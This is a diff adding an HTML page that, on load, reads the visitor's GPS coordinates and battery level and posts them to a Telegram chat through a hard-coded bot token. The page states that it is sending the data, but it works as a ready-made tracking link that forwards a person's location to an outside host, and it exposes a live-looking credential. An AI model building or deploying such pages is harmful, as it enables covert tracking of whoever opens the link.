@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Location and Battery to Telegram</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    color: #fff;
+    margin: 0;
+    padding: 1rem;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    box-sizing: border-box;
+    text-align: center;
+  }
+  h1 {
+    margin-bottom: 0.5rem;
+    font-weight: 700;
+    font-size: 1.8rem;
+    text-shadow: 0 0 8px rgba(0,0,0,0.3);
+  }
+  #info {
+    background: rgba(255,255,255,0.15);
+    border-radius: 15px;
+    padding: 1rem 2rem;
+    box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    max-width: 350px;
+    width: 100%;
+  }
+  #status {
+    margin-top: 1rem;
+    font-size: 0.9rem;
+    opacity: 0.85;
+  }
+  @media (max-width: 400px) {
+    body {
+      padding: 0.5rem;
+      height: 100vh;
+    }
+    #info {
+      padding: 1rem 1rem;
+      max-width: 100%;
+    }
+    h1 {
+      font-size: 1.5rem;
+    }
+  }
+</style>
+</head>
+<body>
+<h1>Your Location & Battery Info</h1>
+<div id="info">
+  <p><strong>Latitude:</strong> <span id="lat">Loading...</span></p>
+  <p><strong>Longitude:</strong> <span id="lon">Loading...</span></p>
+  <p><strong>Battery Level:</strong> <span id="battery">Loading...</span></p>
+  <p id="status">Requesting your data... Please allow location and battery access if prompted.</p>
+</div>
+
+<script>
+(async function() {
+  const latSpan = document.getElementById('lat');
+  const lonSpan = document.getElementById('lon');
+  const batterySpan = document.getElementById('battery');
+  const statusP = document.getElementById('status');
+
+  // Telegram Bot info
+  const TELEGRAM_BOT_TOKEN = '7519869932:AAFPOkb6TVrNwuYg5Ktino3YSwbiaEY6IxY';
+  // Replace chat_id below with your own chat ID to receive messages
+  // For demonstration, use @username or a chat_id number
+  const TELEGRAM_CHAT_ID = '@your_chat_id_here'; // User must replace this with actual chat id or username
+
+  // We need to inform user to replace this chat id to receive messages
+  // but since the user requested no extra text, we keep this as is
+
+  function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    return fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    });
+  }
+
+  function formatBatteryLevel(level) {
+    if(level === null) return 'N/A';
+    return (level * 100).toFixed(0) + '%';
+  }
+
+  try {
+    // Get location
+    const position = await new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        reject(new Error('Geolocation not supported'));
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 15000});
+    });
+    const latitude = position.coords.latitude.toFixed(6);
+    const longitude = position.coords.longitude.toFixed(6);
+
+    latSpan.textContent = latitude;
+    lonSpan.textContent = longitude;
+
+    // Get battery level if supported
+    let batteryLevel = null;
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryLevel = battery.level;
+        batterySpan.textContent = formatBatteryLevel(batteryLevel);
+      } catch {
+        batterySpan.textContent = 'Unavailable';
+      }
+    } else {
+      batterySpan.textContent = 'Not supported';
+    }
+
+    statusP.textContent = 'Sending your location and battery info to Telegram...';
+
+    const message = `User Location and Battery Info:\nLatitude: ${latitude}\nLongitude: ${longitude}\nBattery: ${formatBatteryLevel(batteryLevel)}`;
+    await sendToTelegram(message);
+
+    statusP.textContent = 'Data sent to Telegram successfully.';
+
+  } catch (error) {
+    latSpan.textContent = 'Error';
+    lonSpan.textContent = 'Error';
+    batterySpan.textContent = 'Error';
+    statusP.textContent = 'Error: ' + error.message;
+  }
+})();
+</script>
+</body>
+</html>
+
+```
